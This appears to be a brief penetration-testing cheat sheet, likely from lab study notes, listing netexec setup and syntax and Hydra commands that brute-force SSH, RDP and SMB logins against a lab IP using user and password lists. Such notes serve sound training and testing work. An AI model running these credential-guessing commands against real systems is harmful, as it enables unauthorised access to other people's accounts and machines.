## Netexec
setup
```
sudo apt-get -y install netexec
```

syntax
```
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
---

## Hydra

ssh
```
hydra -L user.list -P password.list ssh://10.129.42.197
```

rdp
```
hydra -L user.list -P password.list rdp://10.129.42.197
```

smb
```
hydra -L user.list -P password.list smb://10.129.42.197
```

